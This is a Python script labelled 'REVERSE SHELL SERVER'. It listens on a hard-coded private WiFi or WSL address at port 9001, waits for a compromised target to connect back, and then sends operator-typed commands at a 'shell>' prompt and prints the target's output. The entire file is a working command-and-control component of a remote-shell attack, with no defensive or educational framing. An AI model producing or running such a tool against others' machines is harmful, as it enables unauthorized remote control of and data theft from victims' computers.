#!/usr/bin/env python3
import socket
import sys
import threading
import os
import subprocess

def start_server(host='192.168.1.110', port=9001):
    """
    Start reverse shell server
    Use 192.168.1.110 for WiFi connections
    Use 172.17.144.1 for WSL connections
    """
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind((host, port))
        server.listen(5)
        print(f"[*] Listening on {host}:{port}")
        print(f"[*] Target should connect to: {host}:{port}")
    except Exception as e:
        print(f"[!] Failed to bind to {host}:{port}")
        print(f"[!] Error: {e}")
        print("\n[*] Trying alternative IPs...")
        print("[*] If on same WiFi, target should connect to: 192.168.1.110:9001")
        print("[*] If in WSL, target should connect to: 172.17.144.1:9001")
        sys.exit(1)
    
    client_socket, client_addr = server.accept()
    print(f"[+] Connection from {client_addr[0]}:{client_addr[1]}")
    
    try:
        while True:
            command = input("shell> ")
            
            if command.lower() == 'exit':
                client_socket.send(b'exit')
                break
            elif command.lower() == 'quit':
                break
            elif command.strip() == '':
                continue
            else:
                client_socket.send(command.encode())
                
                # Receive and display output
                while True:
                    try:
                        output = client_socket.recv(4096).decode(errors='ignore')
                        if not output:
                            break
                        print(output, end='')
                    except:
                        break
                    
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        client_socket.close()
        server.close()
        print("[*] Connection closed")

if __name__ == "__main__":
    print("="*50)
    print("REVERSE SHELL SERVER")
    print("="*50)
    print("Your IP addresses:")
    print("  WiFi:      192.168.1.110  (for other computers on same WiFi)")
    print("  WSL:       172.17.144.1   (for WSL instances)")
    print("="*50)
    
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = int(sys.argv[2])
    elif len(sys.argv) == 2:
        host = sys.argv[1]
        port = 9001
    else:
        # Default to WiFi IP
        host = '192.168.1.110'
        port = 9001
    
    print(f"\n[*] Starting server on {host}:{port}")
    print("[*] Press Ctrl+C to stop\n")
    
    start_server(host, port)